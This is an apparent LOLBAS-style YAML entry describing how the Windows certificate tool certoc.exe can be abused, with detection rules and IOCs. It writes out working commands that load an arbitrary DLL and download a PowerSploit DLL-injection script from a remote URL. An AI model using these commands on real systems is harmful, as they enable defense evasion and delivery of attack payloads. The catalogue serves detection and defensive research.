---
Name: CertOC.exe
Description: Used for installing certificates
Author: 'Ensar Samil'
Created: 2021-10-07
Commands:
  - Command: certoc.exe -LoadDLL "C:\test\calc.dll"
    Description: Loads the target DLL file
    Usecase: Execute code within DLL file
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows Server 2022
  - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
    Description: Downloads text formatted files
    Usecase: Download scripts, webshells etc.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Server 2022
Full_Path:
  - Path: c:\windows\system32\certoc.exe
  - Path: c:\windows\syswow64\certoc.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/406f10b583469f7f7c245ff41002f75902693b7d/rules/windows/process_creation/process_creation_certoc_execution.yml
  - IOC: Process creation with given parameter
  - IOC: Unsigned DLL load via certoc.exe
  - IOC: Network connection via certoc.exe
Resources:
  - Link: https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
  - Link: https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
Acknowledgement:
  - Person: Ensar Samil
    Handle: '@sblmsrsn'
---
